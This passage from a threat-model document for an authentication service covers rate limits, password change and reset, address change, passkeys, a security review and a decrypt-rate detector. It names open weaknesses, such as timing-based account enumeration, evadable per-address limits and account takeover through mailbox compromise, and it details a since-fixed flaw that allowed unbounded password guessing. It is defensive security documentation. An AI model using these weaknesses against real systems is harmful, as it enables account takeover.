  across N of them), and its map is capacity-bounded, which means a caller can
  evict their own counter by spraying unrelated addresses until it turns over.
  Eviction fails OPEN deliberately: failing closed would let whoever fills the map
  deny logins to every user in the product, which is worse than the spraying it
  would be trying to stop. The account half is the durable ceiling precisely
  because this half is evadable.
- *PER-IP LIMITING IS NOT SHIPPED AND §4 TB1 IS CORRECTED RATHER THAN SATISFIED.*
  That section has claimed "per-IP+per-account rate limits" as an existing
  control since the document was written. There is no client IP anywhere in
  identity — no `X-Forwarded-For` read, no `req.ip`, and `sessions.ip_ct` /
  `auth_events.ip_ct` are declared and written by nothing — and neither public
  edge forwards one. Per-IP limiting belongs at the WAF, which is blocked on the
  M5 cloud half (an AWS org and billing, not an engineering decision). §4 now
  marks the per-IP half as unbuilt instead of asserting it.
- *`login.failed` rows remain unattributed on the unknown-address path.* The
  append-only ledger is evidence about accounts that exist, and is not — and
  cannot be — the counter for the rest. Pinned as a known property by an int
  case rather than left to be rediscovered.
- *Registration's enumeration channel is a TIMING one and a bound does not close
  it.* The duplicate path returns early having done less work; the fix its own
  docstring names is a fixed-shape, fixed-time response, which is a separate
  change. What the bound closes is the cost, not the leak.
- *The other unauthenticated routes are deliberately unbounded.* `POST
  /v1/auth/handoff/redeem` and `POST /v1/auth/extension/pairing/redeem` check a
  guessable secret with no attempt cap by construction — a wrong guess resolves
  no row, so there is nothing to attribute a count to, which is the shape M14's
  round-2 review found making a cap decorative. Their bound remains 160 bits of
  entropy, a short TTL and burn-on-attempt. `POST /v1/auth/refresh` and `POST
  /v1/auth/logout/refresh` are likewise unbounded; both resolve a 256-bit token
  or nothing.
- *The authenticated routes that check a secret were NOT considered here, and
  one of them needed a bound.* This delta's list above enumerates only
  UNAUTHENTICATED routes, which is how `POST /v1/auth/password` — whose whole
  purpose is to defend against a stolen session — went unbounded until the PR6
  review measured it (§6p). The list is now: login, register and password
  change are bounded; handoff/pairing redeem and the two refresh routes are
  deliberately not.
- *The bounds are per-service-instance for the address half and per-account for
  the ledger half; neither is a global quota.* §4 TB1's "per-tenant load
  shedding" is unrelated infrastructure work and is not delivered here.

### What M17 PR1 closes that predates it

- *§6a's SRP rate-limiting residual — still only in part, and NOT by this change.*
  M16 closed the step-up half transitively. Login now has its own bound, which is
  what §6a's sentence pointed at, but a caller holding a genuine step-up can
  still burn vault SRP handshakes. That half stays open and is tracked in §6a.
- *§6i's "no rate limiting on handoff minting" is UNCHANGED.* Minting is
  step-up gated and therefore already sits behind the M16 cap; the standing
  follow-up it named was login's, which is now delivered, so its cross-reference
  is corrected rather than its residual closed.
- *§6g's redeem-route residual is UNCHANGED and is edge work.* A per-caller
  bound there needs a caller identity this platform does not have; the 160-bit
  code is the control.

## 6l. Threat-model delta — M17 PR2, the password change (2026-08-12)

**Identity has never had a route that changes a password.** Sixteen milestones of
authentication with no way to rotate the credential all of it rests on, and no
deferral written anywhere — every "password reset" string in these documents
refers to the VAULT password (Zone A, M6), which is a different credential under
a different key hierarchy.

**The gate is BOTH halves, and each covers what the other cannot.**

| presented | what it proves | what a thief lacking it cannot do |
|---|---|---|
| current password | knowledge of the secret being replaced | a stolen SESSION cannot lock the owner out |
| fresh step-up (where a factor exists) | possession of the account's factor | a stolen PASSWORD cannot be made permanent |

The step-up half is **conditional**, on `SecondFactorGate`'s existing predicate:
an account with no verified factor has nothing to prove, and an unconditional
gate would make its password unchangeable forever — the worst available answer
for exactly the users least protected. The step-up question is asked BEFORE the
password check, so the route is not a free password oracle and the refusal's
timing does not vary with whether the guess was right.

**THE OLD HASH IS NO LONGER KEPT** (identity migration 008). `users_versions`
captures a row image on every `users` UPDATE, and this is the first UPDATE
`password_hash` has ever had, so before this change every password change would
have written its predecessor's Argon2id verifier into a table this schema
REVOKEs UPDATE and DELETE on. The M6 vault precedent does **not** transfer as
stated — an old hash verifies a RETIRED password, not the current secret, and
nothing in the repo reads `users_versions` — but that comment's *justification*
does: it keeps full row images everywhere else because "the ciphertext in it is
readable with the same key as the live row", i.e. crypto-shredding reaches the
capture. `password_hash` is the ONE column in `users` for which that is false. A
row image that survives a crypto-shred must not contain a credential verifier.
`email_ct` and `dek_id` are deliberately kept: they *are* under the envelope, and
they carry the audit value the trigger exists for.

**Ordering is the control, again.** `CREATE OR REPLACE FUNCTION` only affects
future captures, so a redaction shipped one release after the first write leaves
verifiers nothing can retract. The migration and the route are the same commit.

**Identity gained a transaction and an actor.** It was the only service of the
nine with no `withTransaction` and no `set_config('app.actor_id')` — measured,
every row that trigger has written came back with a NULL actor. Both halves
matter here: the hash write and the session revocation commit together (a hash
without the revocation leaves every credential minted under the old password
live), and the capture now records who. Redaction is only defensible because
what survives is who and when.

**A password change revokes every OTHER session, and keeps the caller's.** That
session has just proved the current password and, where one exists, a fresh
factor — it is the one credential in the set demonstrably held by someone who
knows the secret being replaced. Signing the changer out too is defensible and
is rejected on the M6 rule: a password change that ends your session teaches
people not to change their password.

**A FIFTH NOTIFICATIONS EDGE** (`NOTIFICATIONS_SECURITY_INTERNAL_TOKEN`, holder
identity alone). A silent password change is unacceptable and undoing M14's
split is worse. Three options existed, not two:

- *add identity to the estate SEND edge* — **impossible as a narrow grant**:
  `SendSchema` is built per-ROUTE from `ESTATE_NOTIFICATION_KINDS`, so there is
  no mechanism anywhere to give one holder a subset. Identity would get all ten,
  including `settlement.case_opened` and every `emergency.*`.
- *widen the existing VERIFY edge*, whose holder is already identity alone —
  **declined on that edge's own recorded reasoning**. It was split from
  RECIPIENTS so that "the first future holder of a resend capability" would not
  inherit a power it should not have; a support tool or a BFF-side resend is
  exactly that holder, and it must not arrive carrying the ability to tell a user
  their password changed.
- *a fifth edge* — **taken**.

The kind is a SYSTEM kind and, within that, a member of a narrower
`ACCOUNT_SECURITY_KINDS`. Three send routes now have three disjoint
vocabularies, each schema built from its own list, so no holder of one credential
can fire another's. The body carries **no variables at all** — not even a
timestamp, though "changed at 14:02" would read better — because the moment this
wire carries one, a holder chooses part of what the user reads.

### Residuals, stated rather than implied

- *The notice is best-effort and its failure is recorded, not retried.* The
  change commits first; a notification that cannot be delivered leaves
  `notified: failed` on the audit event (the M13 `ownerNotified` shape) for an
  operator to re-drive. Sending first would risk telling someone their password
  changed when it had not.
- *An attacker who has BOTH the password and a fresh step-up can change it.* That
  is not a gap this route can close — it is the definition of holding the
  account — and what bounds it is the notice, the audit event, and the fact that
  every other session dies in the same transaction, so the owner's own client
  discovers it at once.
- *A password change does not touch the VAULT.* The Zone A master key derives
  from the vault password and Secret Key under 2SKD, never from the account
  password. Nothing here re-keys, re-wraps or invalidates anything in Zone A,
  and no surface says otherwise (PR3 owes the same statement, more loudly,
  because a RESET is where a user is most likely to assume it).
- *`auth_events` gains `password.changed` and `password.change_failed`, and
  deliberately NOT `stepup.granted`.* That literal is hardcoded in the
  owner-liveness interlock, so emitting it would silently void an open §5.1 death
  case as a side effect — a policy decision taken by accident and a capability
  handed to whoever completed the change.
- *The route is account-audience only.* A vault or extension session cannot
  replace the credential that mints it; a leaked derived credential must not be
  able to chain itself into permanent control, which survives revoking the
  credential that did it.
- *Still no reset.* A user who has FORGOTTEN their password cannot use this
  route, by construction — it requires the current one. That is PR3.

## 6m. Threat-model delta — M17 PR3, the password reset (2026-08-13)

**A user who has forgotten their password had no way back.** PR2 gave the
platform a password CHANGE, which requires the current password by
construction; this is the other half, and it is the most dangerous route the
milestone adds — an unauthenticated ceremony that replaces the credential
everything else rests on.

**It mints nothing.** Redemption sets the password and returns no tokens, no
session, no step-up; the user signs in afterwards with what they chose. That is
the answer to "does redeeming a reset code grant step-up?" made *structural*
rather than kept as a rule: there is nothing to grant it to. The M15 PR4 review
is why it matters — an unauthenticated redeem route that granted step-up let a
stolen 60-second handoff code reach `POST /v1/vault/reset`, which is gated on
step-up alone, and crypto-shred a Zone A vault. A reset code granting step-up
would be that primitive delivered by email to a code that lives thirty minutes.
`test/mint-paths.spec.ts` asserts the set of session-minting paths and proves the
reset absent from it.

**A fourth `recovery` audience would not have helped.**
`AllowSessionAudiences` unconditionally prepends `account` and identity binds no
service-wide list, so a completion route admitting `recovery` would *also* be
reachable by every ordinary account session — a
set-a-new-password-without-the-current-one route behind any stolen bearer.

### THE DECISION THAT MOST WEAKENS THIS: no second factor

**A reset requires the mailed code and nothing else, even for an account holding
a verified TOTP or passkey.** Taken deliberately, and the consequence is stated
plainly rather than softened:

> For an account with a verified second factor, control of the mailbox is
> control of the account. A verified second factor does **not** protect against
> mailbox compromise.

That is a real weakening of M16's investment in step-up, and it buys one thing:
nobody is ever permanently locked out. The alternative — requiring the factor —
would leave a user who forgot their password *and* lost their authenticator with
no self-service path and no operator remedy, because TB7 does not exist and
there are no recovery codes. What bounds the damage, and none of it is
speculative:

- **the vault is untouched.** Zone A's master key derives from the vault
  password and Secret Key under 2SKD, never from the account password. A reset
  re-keys, re-wraps and opens nothing there, and the mailed body says so in
  words, because the vault origin already tells users Estate cannot reset that
  password for them.
- **every session is revoked**, so the real owner is signed out and notices.
- **the owner is mailed** on completion, on the M17 PR2 account-security edge.
- the whole sequence is on the audit trail: requested, completed, and every
  refusal.

PR5 (the passkey surface) revisited this and RE-DECLINED it, for the reason
recorded in §6o: requiring a passkey at reset turns lost-passkey-plus-forgotten-
password into a permanent lockout with no recovery codes and no TB7. A
recovery-codes ceremony remains the change that could strengthen this without
that trade; until then it is the platform's weakest link on risk #1 and should
be read as such.

### The rest of the shape

- **The request route is enumeration-safe by CONSTRUCTION, not by policy.** It
  answers `202` for every input and does the work off the response path — the
  mint-and-send is fired without being awaited — so an address with an account
  cannot answer measurably later than a stranger's. Register's own docstring
  records that timing residual as still open; this route avoids inheriting it,
  which matters more here because a hit tells an attacker where to point a
  mailbox compromise.
- **Two bounds, and the per-address one is primary.** The per-account re-issue
  floor (30 min) can only be evaluated once an address resolves to a user, so it
  sees nothing at all for an address with no account — most of what an abuser
  sends. The per-address bound (10 per 15 min, in memory, per process) refuses
  before any lookup. Its refusal is SILENT, because the route tells a caller
  nothing either way.
- **The status allowlist rides the UPDATE.** `deceased_pending` is permitted
  (§5.1's rescue path is the living owner signing back in); `settlement` is
  refused, so whoever controls a decedent's mailbox cannot recover a terminally
  locked account.
- **Its own ledger kinds, never `stepup.granted`** — that literal is the
  owner-liveness interlock, so emitting it would silently void an open §5.1
  death case and hand that capability to whoever reads the mailbox.
- **A sixth notifications edge** (`NOTIFICATIONS_RECOVERY_INTERNAL_TOKEN`,
  identity alone). Not the VERIFY edge despite the identical holder and a
  near-identical payload: a verification code proves a mailbox and is redeemed
  by somebody already signed in, while a reset code is redeemed with no session
  at all. Four send routes now build from four closed kind lists, so no holder
  of one can fire another's.
- **Atomicity is the control.** Spending the code, writing the hash and revoking
  the sessions are one transaction: a spend without the write burns the user's
  only recovery code, and a write without the spend leaves the code replayable
  by whoever read that mailbox.

### Residuals

- *The reset does not clear PR1's login bound.* A user locked out of NEW logins
  by a sustained wrong-password attack can reset successfully and still be
  refused at login until that window lapses (15 minutes). Emitting a
  `login.succeeded` to clear it would be a lie in the ledger, and the window is
  short enough that waiting is the honest remedy.
- *There is no reset SURFACE.* PR3 ships the routes; no BFF resolver and no
  screen call them, so this is a zero-callers gap of exactly the kind this repo
  keeps closing — recorded here rather than discovered later. The same is true
  of PR2's change route.
- *An unauthenticated route now causes mail.* §6h refused to fire a notification
  kind at registration for that reason, and PR1 narrowed only half of that
  refusal. The deviation is argued rather than inherited: the bound above is
  per-process and best-effort, so what actually keeps this route from being a
  mail-bomb primitive is the per-account floor of one code per thirty minutes,
  which applies to the address being mailed rather than to the caller.
- *No attempt cap on redemption*, deliberately: the redeemer is unauthenticated
  and a wrong guess resolves no row, so a counter keyed on a resolved row would
  be the decorative cap the M14 round-2 review found. The bound is 160 bits, a
  30-minute TTL, and burn-on-attempt.
- *The address-change lockout §6h records is NOT closed by this.* A reset mails
  to the address already on file, so for a user who mistyped their address at
  registration it changes nothing. CLOSED by PR4 — see §6n.

**Proven live, and one defect the whole suite passed over.** Driven end to end
against the running stack: a request answers 202 for an address with an account
and for one without, a real SES message carries the `PR1-…` code, the code
RETYPED THE WAY A HUMAN RETYPES IT (lowercase, grouping dashes dropped) is
accepted, the old password stops working, the session held before the reset
answers 401, a replay is refused, and `notification_sends` records the send
while `password_resets` holds a 32-byte digest that does not contain the code.
Every refusal — wrong code, mis-shaped code, replay — is one `invalid_code` on
the wire AND `{}` detail with a null actor in the audit trail, so the trail
does not re-create the oracle the uniform answer removes. The owner is told
their password changed by PR2's account-security notice, which fires on the
reset path too.

The first drive found that the ceremony COULD NOT COMPLETE. `sendPasswordReset`
emitted `{userId, code}` at a route whose `RecoverySchema` is `.strict()` and
requires `kind`, so every send answered 400 — and because identity retires a
code whose send fails, the code was minted, mailed nowhere and revoked. The
whole PR was inert in production while 27 tests passed over it, because the wire
body is declared TWICE and each side's suite validated its own declaration: the
client spec asserted method, URL and credential but never the body, and its own
fixture used a code the pattern rejects; the service specs built valid payloads
by hand. Nothing put one side's OUTPUT into the other side's PARSER. Closed by
`apps/services/notifications/test/wire-parity.spec.ts`, which drives the real
client over a recording transport and parses each emitted body with the schema
its route really uses — derived from the client prototype in one direction and
from the controller source in the other, so an added method or a renamed path
turns it red.

## 6n. Threat-model delta — M17 PR4, the address change (2026-08-13)

**What shipped.** The first way to change a sign-in address in the product's
history: `POST /v1/auth/email/change/request` (stage + mail a challenge),
`POST /v1/auth/email/change` (redeem + switch), `DELETE /v1/auth/email/change`
(withdraw, ungated — the M6 asymmetry). Ten identity routes existed for
credentials and none touched the address; §6h recorded the consequence as a
permanent lockout for anyone who mistyped at registration.

**VERIFY-THEN-SWITCH, and the ordering is the whole design.** Login resolves
users by `email_bidx`, so a change that stored an unproven address would lock
its owner out of LOGIN ITSELF — a typo'd new address must never reach `users`
until a code mailed to it comes back. Consequences, each structural rather than
procedural:

- The old address — login, notifications, everything — keeps working until the
  proof lands. An abandoned or mistyped change costs nothing.
- The M14 forward commitment ("clear `verified_at` in the same statement") is
  discharged one step STRONGER than it asked: no unproven address ever reaches
  the delivery store, so the bit is never cleared — the store's new
  `replace` statement swaps the address and stamps the proof together, and
  there is no moment when the store vouches for an address nobody proved.
- The staged address is encrypted at request time as `users.email` under the
  account's live DEK, so the switch moves CIPHERTEXT — no decrypt inside the
  transaction, and a key rotated or shredded mid-ceremony refuses the switch
  via a `dek_id` predicate restated inside the UPDATE itself.

**The gate is PR2's, verbatim, with §6m's own sentence as the reason:** control
of the mailbox is control of the account, so choosing the mailbox IS choosing
the account's owner of last resort. Current password (a stolen session lacks
it) + conditional step-up (a stolen password lacks it), factor asked FIRST so
the route is not a free password oracle.

**The seventh notifications edge** (`NOTIFICATIONS_EMAIL_CHANGE_INTERNAL_TOKEN`,
holder identity alone) exists because the challenge is INEXPRESSIBLE on every
prior wire: every other send resolves its destination from the encrypted
recipient store by user id, and this ceremony is by definition a challenge to a
mailbox the store does not hold. The edge's grant owns the deviation plainly —
it is the ONE send whose payload names a destination. What bounds it: the body
is doctrine-clean (the code and fixed words, no links, the uniform subject),
the notifications service uses the address for one delivery and STORES NOTHING
(no recipient row is created, read or touched — pinned by an int case), and
the code it mails completes nothing without the account's current password and
a fresh second factor. Widening VERIFY instead was rejected because its
recorded grant — "can only mail a code to whatever address is already on
file" — is precisely the property a future resend-tool holder must keep
inheriting.

**What completion sweeps, in ONE transaction with the switch:** outstanding
password-reset and address-verification codes (both were mailed to the mailbox
being left; a `PR1-` code that outlived the address it was mailed to would hand
whoever reads the OLD mailbox the account the owner just moved away from —
§6m's obligation, discharged), and every session but the caller's (the PR2
posture: the attacker's sessions and the owner's other devices cannot be told
apart).

**The old-address notice is an ORDERING property, not a wire property.** After
the switch commits, identity sends `identity.email_changed` (account-security
wire, carries nothing) BEFORE replacing the recipient — so the store still
resolves the address being LEFT, and the notice reaches the only mailbox whose
reader can dispute a takeover. The copy does not offer "sign in" as the remedy,
because after the change that reader structurally cannot: login uses the new
address. Detection is the notice; response is support. Get the ordering
backwards and the takeover notice goes to the attacker's mailbox — an int case
asserts the sequence.

**Anti-enumeration, register's own posture.** "Is this address registered" is a
fact about somebody else's account, so a taken address is a mail that never
arrives behind a uniform 202 — and because the work differs (KMS, inserts, a
carrier hand-off), the availability lookup and everything after it run DETACHED
from the response, pinned at the source (a runtime test cannot tell a fast
await from no await). Redemption's refusals are one `invalid_code` for every
dead reason — including the candidate address having been registered by someone
else during the 30-minute window, where "taken" would leak the other account
(that refusal burns no attempt: the code was right, the world changed).

**Bounds.** Per-account floor of five minutes between mints (M14's number —
the caller is authenticated and has proved password + factor), keyed on the
LAST MINT so a failing carrier cannot evaluate the floor away; a per-process,
per-DESTINATION bound (10/15min, the reset bound's numbers) because every
request may name a different target and the floor cannot see per-mailbox
volume; a per-user attempt cap of five on redemption, attributable BY DESIGN
(the selector is the authenticated caller, so a wrong guess of any shape burns
one attempt on their own live change — the M14 round-2 mechanic designed in
rather than retrofitted); one live change per user via a partial unique index,
retired UNCONDITIONALLY before every mint (the M14-review wedge).

### Residuals

- *A stale login re-feed can transiently repoint the store to the just-left
  address.* Login (old address) resolves before the switch commits; its
  fire-and-forget recipient upsert lands after the switch's replacement; the
  store then holds the old address until the next login. Self-healing (the next
  login can only carry the NEW address — the old bidx no longer resolves) and
  not attacker-steerable without the owner's own credentials mid-race. The
  upsert's preserved bit stays sound through this: every address that can
  reach the store is either one the user just signed in with or one the
  ceremony just proved.
- *An honest user typing a TAKEN address waits for a mail that never comes.*
  The cost of register's uniform answer, paid here too; the floor is not burned
  for it, so retrying with a corrected address is free.
- *The routes ship with no surface* — no BFF resolver, no screen. The same
  zero-callers gap as PR2's and PR3's, recorded rather than implied; the
  M14 PR3 settings page is where the ceremony belongs when the surface lands.
- *`identity.email_changed`'s reader has no self-service response.* The notice
  reaches the old mailbox, but a hijacked owner cannot sign in (the address
  changed) and cannot reset (the reset mails the NEW address). Their remedy is
  support, which until TB7 means the operator runbook. Recorded plainly: the
  notice is a DETECTION control, not a response one.

## 6o. Threat-model delta — M17 PR5, the passkey surface (2026-08-13)

**What shipped.** Identity's four WebAuthn relying-party routes — shipped in M2
and unreachable for fifteen milestones — gained their first consumers: BFF
resolvers and a web surface for registering, naming, listing and revoking
passkeys, and a passkey path in the shared step-up prompt that every
prompt-and-retry caller inherited without a change. Risk #1's "passkey nudges"
residual treatment moves from unbuilt to partially discharged: the surface
exists and nudges nothing yet; a nudge is copy, not machinery, and can follow.

**Two defects fixed in the shipped machinery before the surface landed on it**
(the PR4 pattern): `hasCredentials` — the WebAuthn half of
`SecondFactorGate.holdsVerifiedFactor` — did not filter `revoked_at`, latent
only because nothing wrote that column; the first revoke route would have armed
it, leaving an account whose last passkey was revoked permanently demanding a
factor it could not produce. And the global `credential_id` uniqueness surfaced
as an unhandled 500 when a second account registered the same authenticator;
it is a typed outcome folded into the one generic ceremony refusal now, because
"this authenticator belongs to another account" is a fact about somebody
else's account.

**Revoking a passkey is STEP-UP GATED, and deliberately unlike the ungated M16
session revoke.** Revoking a session only reduces authority. Revoking a FACTOR
weakens the gate that protects everything else: ungated, a stolen bearer strips
the account's factors, `SecondFactorGate` disarms (no factor ⇒ nothing to
prove ⇒ enrolment ungated), and the thief enrols their own — the 2026-08-12
escalation through the back door. The gate is never vacuous by construction
(the account holds at least the factor being removed), and the fence that
verifies it anchors on the controller's real decorators.

**Failed assertions are on the ledger now** (`webauthn.assertion_failed`). The
2026-08-10 decision said they "emit their own kind"; the code emitted nothing —
an investigator reading the ledger for a §5.1 case saw no trace. The kind is
deliberately in NO rate-bound set: a passkey assertion is not brute-forceable,
and counting it would let a flaky authenticator lock out its own owner.

### Residuals

- **THE VAULT ORIGIN AND THE EXTENSION ARE TOTP-ONLY FOR STEP-UP**, and a
  passkey-only account therefore cannot complete any Zone A step-up-gated
  ceremony (vault setup, reset, item delete, escrow configure/rearm/revoke,
  recovery-key publish). Three facts stack: vault-web and the extension prove
  factors only through `POST /v1/auth/stepup` (a 6-digit TOTP body); the
  WebAuthn assertion routes are account-audience only; and identity verifies
  assertions against ONE `rpOrigin`, which is the web app's — so extending the
  ceremony to `vault.<domain>` is an identity change (an expectedOrigin list),
  an audience widening, two vault-edge proxy entries and a fence table update,
  not a client patch. The web surface says this ON SCREEN ("keep an
  authenticator app enrolled — the vault currently accepts only authenticator
  codes"), the M16 honesty pattern rather than a docs-only footnote.
- **The reset path is re-declined, explicitly** (§6m question 8, owed by this
  PR): a reset still requires the mailed code and nothing else, even for an
  account holding a passkey. Requiring a passkey assertion at reset would turn
  lost-passkey-plus-forgotten-password into a permanent lockout with no
  recovery codes and no TB7 — the same nobody-locked-out-forever reasoning the
  user chose at PR3, unchanged by the surface existing.
- **No passwordless login.** The authenticate routes are session-scoped by
  design (M2's deferral, still deliberate): a passkey here is a step-up factor,
  never a login replacement, and discovery-credential login is its own
  milestone with its own enumeration surface.
- **Browser-side ceremony failures are invisible to the platform.** A user
  whose sheet keeps failing generates no ledger events until an assertion
  actually reaches identity; only the device knows. Accepted: the alternative
  is client-side telemetry, which this product does not do. **Corrected scope
  (PR6):** this residual only ever covered failures that never reach identity.
  Two SERVER-side branches were also silent — no live challenge, and a
  credential id naming nothing or naming somebody else's authenticator — which
  was a defect rather than this residual, and is fixed in §6p.

## 6p. Threat-model delta — M17 PR6, the security review (2026-08-13)

**How it ran.** Seven file-scoped discovery lenses over the merged M17
machinery — never a diff range (the M13 lesson) — then TWO adversarial
verifiers per deduped candidate on different angles: reachability in a real
production config, and is-it-already-a-documented-decision, both defaulting to
REFUTED. Twelve raw candidates, twelve after dedup, **two confirmed**, ten
refuted. Every confirmed finding was then re-proved BY EXECUTION against the
running stack before a line was changed, and every fix mutation-tested by
reverting it. ELEVENTH milestone running in which every confirmed finding sits
in machinery the milestone introduced, and both falsify a claim it made about
itself.

**(1) `POST /v1/auth/password` VERIFIED A PASSWORD WITH NO BOUND OF ANY KIND.**
Measured on the running stack rather than argued: twenty-five wrong
current-password guesses from one session, twenty-five plain 401s, no refusal
ever, and the twenty-sixth — the right one — took the account over. The same
volume against `POST /v1/auth/login` produced ten `login.failed` and four
`login.rate_limited`. One credential-guessing action, two routes, one bounded.

The gap is exactly the shape of §6k's own framing: PR1 bounded "the routes that
take a password from an UNAUTHENTICATED caller", and the change route reads as
authenticated — except that the entire reason it asks for the current password
is the stolen-session threat, so its caller is the party the bound is for. It
mattered most for FACTORLESS accounts, which `SecondFactorGate` deliberately
lets through (the bootstrap: nothing exists to prove), so nothing else stood in
the way.

`PASSWORD_CHANGE_BOUND` closes it with M16's two scopes, and the per-SESSION
half is the load-bearing one: unlike login there IS a credential at the point
of failure, so a stolen session exhausts its own budget and stops while the
owner's other sessions keep theirs — the escape that could not port to login
ports here. The refusal is a 429 with its own token (safe: the route already
required a resolved, authenticated caller, so it tells them about themselves)
and its own ledger kind, because a refusal counted by the bound that produced
it feeds its own counter. A reset deliberately does not clear the window: it
revokes every session, so the attacker's credential is already dead.

**(2) TWO OF THE FOUR FAILING ASSERTION BRANCHES LEFT NO LEDGER TRACE.** M17
PR5 added `webauthn.assertion_failed` precisely to correct a decision-log entry
claiming failed assertions "emit their own kind" when the code emitted nothing
— and the correction was incomplete. Only the crypto-verify catch and the
`userVerified` recheck recorded; the two branches that short-circuit EARLIEST
stayed silent. Measured: ten probes against a live account (five with no
challenge, five submitting a foreign credential id after minting a real
challenge) produced ZERO `webauthn.*` rows. A credential id naming nothing or
naming somebody else's authenticator is the most suspicious probe class there
is — no browser produces one by accident — and it was the one that was
invisible. All four branches record now; the wire answer stays uniform, so the
trail gains detail the caller does not.

### What the review REFUTED, and why the refutations are worth keeping

Ten candidates were refuted, and two of the refutations are load-bearing:

- *"The account-cap refusal skips the in-memory address record, defeating the
  Argon2-cost bound"* — refuted as ALREADY RECORDED. The address bound is
  documented in §6k as per-process, best-effort and evadable; the account bound
  is a durable new-login ceiling, not an Argon2-cost bound, and its one-hash
  cost on a refusing path is stated inline. The residual is real and already
  written down, which is the difference between a finding and a rediscovery.
- *"Historical `users_versions` rows retain the live Argon2id verifier"* —
  refuted on ordering: the migrator applies 001→011 before the app serves, so a
  fresh deploy installs the redacting trigger before any `users` row is ever
  updated, and migration 008's own comment states the pre-migration window and
  why it ships in PR2's commit.

### Residuals

- **One novel-but-unreachable candidate is recorded rather than fixed.** A
  crypto-shredded DEK at email-change completion would surface as a 500 rather
  than the uniform `invalid_code` — no code path destroys a DEK today
  (`destroyDek` still has zero callers). It is NOT fixed here on purpose:
  mapping the decrypt failure to `invalid_code` would tell a user "that code
  didn't work" about an account that has been ERASED, and once erasure exists
  the right behaviour is almost certainly that a shredded account cannot reach
  a ceremony route at all (erasure revokes sessions and moves `users.status`
  off the live allowlist, at which point the 500 disappears as a consequence).
  A wrong answer pinned by a test is harder to displace than an absent one, so
  this is filed as a PRECONDITION on the erasure milestone rather than a
  floating residual.
- **Clone detection was the review's other recorded item and is now ANSWERED,
  differently from how it was proposed.** The suggested fix was to revoke the
  credential; the fix taken is to NOTIFY THE OWNER and keep rejecting. The
  counter check is a heuristic: synced passkeys report counter 0 and never
  reach the branch at all (the `storedCounter > 0` guard), so it fires only on
  counter-maintaining authenticators, where a regression is a clone OR a
  firmware/state bug. Auto-revocation would destroy a factor on a hint —
  the M6 rule pointed the wrong way — and on an account with no TOTP it lands
  the owner in exactly the bootstrap-lockout state M17 spent a milestone making
  survivable. `identity.passkey_clone_detected` rides the account-security wire
  (it carries nothing), is sent BEFORE the audit emit so a broker outage cannot
  cancel the warning (the M13 rule), and its delivery outcome rides
  `auth.webauthn.clone_detected` as `notified: delivered|failed` so a warning
  that did not land is visible rather than merely absent. The owner revokes it
  themselves from the surface M17 PR5 shipped.

  **The branch was UNREACHABLE until this change, and only the live drive said
  so.** `@simplewebauthn/server` runs its own counter check inside
  `verifyAuthenticationResponse` and THROWS on a regression, which preempted
  our clone branch and routed every clone into the generic verify catch — so
  the ledger kind, the audit action and (had it shipped as first written) the
  owner's warning were all dead code behind a refusal coming from somewhere
  else. Measured: a forced regression produced two `webauthn.assertion_failed`
  rows and zero `webauthn.clone_detected`. The fix hands the library
  `counter: 0` — its documented "this RP does not track counters" value — so
  this service owns the counter policy and the check runs below, on a VERIFIED
  assertion. That ordering is the security half: checking before verification
  would act on unsigned attacker-supplied bytes and let anyone holding a
  session make the platform mail an owner a clone warning at will. The trigger
  set is unchanged for every reachable state, so no refusal is given up.

  What remains open, stated: a cloned credential stays usable until the owner
  acts, so a later higher-counter assertion from either copy still succeeds.
  That is the deliberate cost of not acting on a heuristic, and the thing that
  would change it is a second signal — not a lower threshold on this one.
- **The password-change bound is per-account durable plus per-session durable**,
  both ledger-derived, so unlike the address bound it survives a restart and is
  shared across replicas. It is NOT a global quota and does not bound an
  attacker who can mint sessions — but minting one requires the password, which
  is what they are trying to guess.

## 6q. Threat-model delta — M18 PR2, the decrypt-rate baseline detector (2026-08-13)

**What shipped.** The detection half of §4 TB4's per-principal decrypt-rate
baseline, running in the audit service against the local stack. The detector
derives per-(prefix-class × principal) windowed counts from the append-only
`audit_events` ledger — no counter state an attacker can reset — and emits
`crypto.decrypt_rate.exceeded` through the service's first Kafka producer,
via the sanctioned AuditEmitter path, onto the same topic it consumes: the
anomaly lands in the verified hash chain like any other event. Attribution is
the M18 PR1 registry (the field name's first dotted token); the principal
grain separates the nil-UUID sentinel from every real actor class. Bounds are
fixed reviewed constants set from measured ceilings with a generous
multiplier, and everything OUTSIDE the reviewed table is bound 0 — an
unregistered prefix (`unknown_prefix`), an unmodelled (prefix × principal)
combination (`unmodeled_principal`), and settlement's encrypt-only
`distributions` (`encrypt_only`) each breach at the first decrypt, because a
read path nobody reviewed is itself the anomaly.

**The alert sink is the chain plus a structured log line, and deliberately
nothing else.** No owner notification: the reader of this signal is a
security operator who does not exist until TB7, and making audit a
notifications SEND holder would falsify its fenced zero-credential posture.
The event is the durable record; the log line is the operational tail.

**Advisory by construction.** The detector runs on its own Postgres session
(never the ingestor's serialized chain connection), started only from
main.ts so test suites structurally cannot run it, unref'd, with every fault
terminating in its own catch and one log line — a detector error must never
take the path the consumer's death takes, because killing ingest (the paging
signal) over an advisory neighbour inverts the M9 rule twice. Losing the
detector degrades alerting, never safety.

**Episode semantics and the honest residuals.**
- A sustained breach emits ONCE per episode and re-arms when its window
  clears. The episode memory is per-process, so a RESTART may re-emit one
  duplicate for a still-breaching principal, and a failed emit is retried
  next tick — in both cases the fail direction is an EXTRA event.
- CORRECTED BY THE M18 PR3 REVIEW, which found the unqualified
  "never a lost one" false twice over. (a) The reconciliation that ends
  episodes ran after the emit loop inside the same try, so one failed emit
  skipped it: a principal whose episode had cleared stayed marked announced
  and its NEXT genuine episode was suppressed — a lost anomaly, reproduced
  against the real detector. (b) The emit loop shared one try, so the first
  unemittable breach cancelled every later breach in that tick. Both closed
  (per-emit catch; reconciliation moved ahead of anything that can fail —
  and the mutation harness showed the catch is the load-bearing half and the
  ordering the belt, which is recorded in the code rather than assumed).
- STILL TRUE AND NOT FIXABLE HERE: an emit outage lasting longer than the
  300s window loses the anomalies raised inside it, because the retry is
  bounded by the window that produced them. Closing it means persisting an
  anomaly before emitting it — a different design, not a patch.
- Bounds for classes the M18 PR1 measurement did not exercise (family,
  asset_event, plaid_item, account, assistant_tool_call, users) are
  PROVISIONAL — sized from neighbouring measured economics and marked as such
  in the table; live traffic is what re-calibrates them, by reviewed commit.
- A full asset-projection rebuild of a large estate TRIPS the sentinel's
  asset_event bound BY DESIGN: a mass decrypt is the detected class, and the
  operator running one expects the alarm. One event per episode keeps that
  honest rather than noisy.
- Detection latency is bounded by tick cadence (60s) plus the broker hop;
  the window (300s) exceeds both, so nothing legitimate hides between ticks.
